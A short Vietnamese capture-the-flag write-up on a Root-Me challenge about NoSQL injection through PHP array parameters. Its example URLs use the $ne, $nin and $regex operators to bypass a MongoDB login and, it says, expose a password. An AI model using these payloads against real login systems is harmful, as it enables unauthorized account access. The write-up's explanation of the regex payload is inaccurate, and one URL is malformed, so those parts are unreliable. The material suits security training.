Đọc doc của rootme thấy có 1 dạng inject vào nosql rất phổ biến, đó là inject với mảng php, đại khái là khi truy cập vào đường dẫn này:

> http://challenge01.root-me.org/web-serveur/ch38/?login=admin&pass=admin

Nosql sẽ thực hiện truy vấn như sau:

> db.logins.find({ login: ‘tolkien’, pass: ‘admin’})

Nhưng nếu ta sửa lại đường dẫn :

> http://challenge01.root-me.org/web-serveur/ch38/?login[$ne]=1&pass[$ne]=1

Nosql sẽ truy vấn là :

> db.logins.find({ login: { $ne: 1 }, pass: { $ne: 1 } })

Và trong nosql, $ne nghĩa là not equal, và câu truy vấn trên sẽ bằng với câu sau trong mysql:

> SELECT * FROM logins WHERE username <>1 AND password <>1

Thử với trang web của rootme, chỉ có thông báo `you are connected as admin` hiện ra

Sửa url, thay 1 bằng admin, thông báo khác hiện ra :

`you are connected as test`

Nosql còn 1 toán tử nữa là $nin(not in), thử với url

> http://challenge01.root-me.org/web-serveur/ch38/?login[$nin][[][]=[admin,test]&pass[$ne]=1

vẫn không ra. Còn phép thử cuối cùng với `$regex`:

http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=`[^admin][^test]`&pass[$ne]=

có nghĩa là login không trùng với admin hoặc test. Khi đó password sẽ hiện ra 